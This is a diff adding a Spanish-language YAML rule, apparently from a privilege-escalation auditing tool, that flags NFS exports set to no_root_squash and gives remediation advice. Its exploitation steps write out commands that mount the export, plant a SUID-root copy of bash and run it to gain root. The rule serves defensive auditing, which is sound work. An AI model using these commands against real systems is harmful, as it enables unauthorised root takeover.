@@ -1,0 +1,35 @@
+id: nfs-no-root-squash
+title: "Export NFS con no_root_squash"
+category: nfs
+vector: nfs
+severity: high
+tier: C
+reaches_root: true
+validator: nfs_no_root_squash
+
+match:
+  all:
+    - path: nfs_exports
+      where:
+        all:
+          - path: no_root_squash
+            truthy: true
+
+step: "El export {target} permite no_root_squash: desde un cliente donde el atacante es root puede crear un binario SUID root que luego ejecuta aquí."
+
+exploitation_steps: |
+  NO verificado (requiere privilegios root en un cliente NFS, fuera del alcance
+  de esta corrida). Procedimiento:
+    (en el cliente, como root)
+      mkdir /mnt/x && mount -t nfs SERVIDOR:{target} /mnt/x
+      cp /bin/bash /mnt/x/rootbash && chmod 4755 /mnt/x/rootbash
+    (en el servidor, como {user})
+      {target}/rootbash -p        -> uid=0
+
+remediation: |
+  Quitar `no_root_squash` de /etc/exports (usar el default `root_squash`).
+  Restringir el export por host/red, montar `ro` cuando sea posible, y usar
+  `sec=krb5p` si aplica.
+
+references:
+  - https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html
